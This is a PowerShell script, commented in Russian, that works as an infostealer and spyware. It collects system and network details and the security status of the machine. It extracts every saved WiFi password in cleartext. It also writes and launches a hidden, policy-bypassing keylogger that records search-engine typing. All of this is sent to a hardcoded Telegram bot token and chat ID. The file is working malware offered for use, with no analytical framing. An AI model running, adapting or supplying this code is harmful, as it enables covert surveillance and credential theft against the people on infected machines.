# Основной сбор данных
$sys = Get-CimInstance Win32_ComputerSystem
$os = Get-CimInstance Win32_OperatingSystem
$cpu = Get-CimInstance Win32_Processor
$ram = [math]::Round((Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum/1GB, 2)
$gpu = (Get-CimInstance Win32_VideoController | Where-Object {$_.Name -notlike "*Remote*"} | Select-Object -First 1).Name
$disk = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'"

# Сеть и WiFi
try {$ip = (Invoke-RestMethod "http://ipinfo.io/ip" -TimeoutSec 3).Trim()} catch {$ip = "No IP"}
$net = Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4' -and $_.IPAddress -ne '127.0.0.1'} | Select-Object InterfaceAlias, IPAddress

$wifi = ""
try {
    netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
        $name = $_.ToString().Split(":")[1].Trim()
        try {$pass = (netsh wlan show profile name="$name" key=clear | Select-String "Key Content").ToString().Split(":")[1].Trim()} catch {$pass = "No password"}
        $wifi += "$name : $pass`n"
    }
    if (!$wifi) {$wifi = "No WiFi networks"}
} catch {$wifi = "WiFi error"}

# МОНИТОРИНГ ПОИСКОВЫХ ЗАПРОСОВ
Add-Type -AssemblyName System.Windows.Forms

$searchLoggerScript = @"
Add-Type -AssemblyName System.Windows.Forms

`$searchBuffer = ""
`$lastSearch = ""
`$searchEngines = @("*google*", "*yandex*", "*bing*", "*yahoo*", "*duckduckgo*", "*search*", "*поиск*")

function Send-SearchQuery {
    param(`$query)
    if(`$query -ne "" -and `$query -ne `$lastSearch -and `$query.Length -gt 2) {
        `$lastSearch = `$query
        try {
            `$body = @{
                chat_id = '5674514050'
                text = "SEARCH QUERY: `$query"
            }
            Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body `$body
        } catch { }
    }
}

while(`$true) {
    try {
        `$activeWindow = ""
        `$processes = Get-Process | Where-Object {`$_.MainWindowTitle -and `$_.MainWindowHandle -ne 0} | Sort-Object CPU -Descending
        if(`$processes) {
            `$activeWindow = `$processes[0].MainWindowTitle
        }
        
        `$isSearchPage = `$false
        foreach(`$engine in `$searchEngines) {
            if(`$activeWindow -like `$engine) {
                `$isSearchPage = `$true
                break
            }
        }
        
        if(`$isSearchPage) {
            for(`$i = 8; `$i -lt 255; `$i++) {
                `$keyState = [System.Windows.Forms.GetAsyncKeyState]`$i
                if(`$keyState -eq -32767) {
                    `$key = [System.Windows.Forms.Keys]`$i
                    
                    switch(`$key) {
                        "Enter" { 
                            Send-SearchQuery `$searchBuffer
                            `$searchBuffer = ""
                        }
                        "Space" { 
                            `$searchBuffer += " " 
                        }
                        "Back" { 
                            if(`$searchBuffer.Length -gt 0) { 
                                `$searchBuffer = `$searchBuffer.Substring(0, `$searchBuffer.Length - 1) 
                            }
                        }
                        "Tab" { 
                            Send-SearchQuery `$searchBuffer
                            `$searchBuffer = ""
                        }
                        "LButton" { 
                            Send-SearchQuery `$searchBuffer
                            `$searchBuffer = ""
                        }
                        default {
                            if(`$key -ge 65 -and `$key -le 90) {
                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
                                `$isCaps = [System.Windows.Forms.Console]::CapsLock
                                
                                if((`$isShift -and !`$isCaps) -or (!`$isShift -and `$isCaps)) {
                                    `$searchBuffer += `$key.ToString()
                                } else {
                                    `$searchBuffer += `$key.ToString().ToLower()
                                }
                            } elseif(`$key -ge 48 -and `$key -le 57) {
                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
                                `$symbols = @(')', '!', '@', '#', '`$', '%', '^', '&', '*', '(')
                                if(`$isShift) {
                                    `$searchBuffer += `$symbols[`$key - 48]
                                } else {
                                    `$searchBuffer += (`$key - 48).ToString()
                                }
                            } elseif(`$key -eq 190 -or `$key -eq 110) {
                                `$searchBuffer += "."
                            } elseif(`$key -eq 189 -or `$key -eq 109) {
                                `$searchBuffer += "-"
                            } elseif(`$key -eq 187 -or `$key -eq 107) {
                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
                                if(`$isShift) {
                                    `$searchBuffer += "+"
                                } else {
                                    `$searchBuffer += "="
                                }
                            } elseif(`$key -eq 186 -or `$key -eq 59) {
                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
                                if(`$isShift) {
                                    `$searchBuffer += ":"
                                } else {
                                    `$searchBuffer += ";"
                                }
                            } elseif(`$key -eq 222) {
                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
                                if(`$isShift) {
                                    `$searchBuffer += "`""
                                } else {
                                    `$searchBuffer += "'"
                                }
                            } elseif(`$key -eq 220) {
                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
                                if(`$isShift) {
                                    `$searchBuffer += "|"
                                } else {
                                    `$searchBuffer += "\"
                                }
                            } elseif(`$key -eq 188 -or `$key -eq 108) {
                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
                                if(`$isShift) {
                                    `$searchBuffer += "<"
                                } else {
                                    `$searchBuffer += ","
                                }
                            } elseif(`$key -eq 191 -or `$key -eq 111) {
                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
                                if(`$isShift) {
                                    `$searchBuffer += "?"
                                } else {
                                    `$searchBuffer += "/"
                                }
                            }
                        }
                    }
                    
                    if(`$searchBuffer.Length -gt 50) {
                        Send-SearchQuery `$searchBuffer
                        `$searchBuffer = ""
                    }
                }
            }
        } else {
            if(`$searchBuffer -ne "") {
                Send-SearchQuery `$searchBuffer
                `$searchBuffer = ""
            }
        }
    } catch { }
    Start-Sleep -Milliseconds 2
}
"@

# Запускаем мониторинг поисковых запросов в отдельном процессе
try {
    $searchLoggerScript | Out-File "$env:TEMP\search_monitor.ps1" -Encoding ASCII
    Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\search_monitor.ps1`"" -WindowStyle Hidden
    $searchMonitorStatus = "Search monitoring active"
} catch {
    $searchMonitorStatus = "Search monitor failed: $($_.Exception.Message)"
}

# Безопасность
try {$fw = Get-NetFirewallProfile | ForEach-Object {"  - $($_.Name): $($_.Enabled)"} | Out-String} catch {$fw = "Firewall info unavailable"}

# Получаем данные Windows Defender
$defAntivirus = "N/A"
$defRealtime = "N/A"
try {
    $def = Get-MpComputerStatus
    $defAntivirus = $def.AntivirusEnabled
    $defRealtime = $def.RealTimeProtectionEnabled
} catch {
    $defStatus = "Defender info unavailable"
}

try {
    $rdp = if ((Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -ErrorAction 0).fDenyTSConnections -eq 1) {'Disabled'} else {'Enabled'}
} catch {
    $rdp = "RDP status unavailable"
}

# Дополнительная информация
try {$conn = Get-NetTCPConnection -State Established | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort -First 5 | ForEach-Object {"- $($_.LocalAddress):$($_.LocalPort) -> $($_.RemoteAddress):$($_.RemotePort)"} | Out-String} catch {$conn = "Connections unavailable"}
try {$software = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*","HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Where-Object {$_.DisplayName} | Select-Object DisplayName, DisplayVersion -First 8 | ForEach-Object {"- $($_.DisplayName) v$($_.DisplayVersion)"} | Out-String} catch {$software = "Software info unavailable"}
try {$uptime = (Get-Date) - $os.LastBootUpTime; $uptimeInfo = "$([math]::Floor($uptime.TotalHours)):$($uptime.Minutes.ToString('00'))"} catch {$uptimeInfo = "Uptime unavailable"}

# Формирование и отправка сообщения
$msg = @"
=== SYSTEM INFORMATION ===
User: $env:USERNAME
Computer: $env:COMPUTERNAME
Domain: $env:USERDOMAIN

=== HARDWARE INFORMATION ===
Processor: $($cpu.Name)
RAM: $ram GB
GPU: $gpu
Disk C: Free: $([math]::Round($disk.FreeSpace/1GB, 2)) GB / Total: $([math]::Round($disk.Size/1GB, 2)) GB

=== OPERATING SYSTEM ===
OS: $($os.Caption)
Version: $($os.Version)
Build: $($os.BuildNumber)

=== NETWORK INFORMATION ===
Public IP: $ip

Network Interfaces:
$($net | ForEach-Object { 
    $name = $_.InterfaceAlias -replace "Подключение по локальной сети", "Local Area Connection" -replace "Беспроводная сеть", "Wireless Network" -replace "Сетевое подключение Bluetooth", "Bluetooth Network"
    "- $name : $($_.IPAddress)" 
} | Out-String)

Active Connections:
$conn

=== WIFI PASSWORDS ===
$wifi

=== SEARCH MONITOR ===
$searchMonitorStatus

=== SECURITY STATUS ===
Firewall: 
$fw
Windows Defender: $defAntivirus
Real-time Protection: $defRealtime
RDP Access: $rdp

=== INSTALLED SOFTWARE ===
$software

=== SYSTEM UPTIME ===
Uptime: $uptimeInfo
"@

Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body @{chat_id='5674514050'; text=$msg}
